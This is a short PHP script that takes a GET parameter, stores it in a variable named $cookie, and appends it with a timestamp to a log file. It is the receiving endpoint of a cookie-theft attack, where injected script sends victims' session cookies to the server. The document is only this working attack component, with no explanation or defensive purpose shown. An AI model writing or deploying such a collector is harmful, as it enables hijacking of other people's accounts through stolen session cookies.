<?php
	$cookie=$_GET['data'];
	$atime=date("y-m-d H:i:s");
	$log=fopen("data.txt","a");
	fwrite($log, $atime." ".$cookie."\r\n");
	fclose($log);
?>
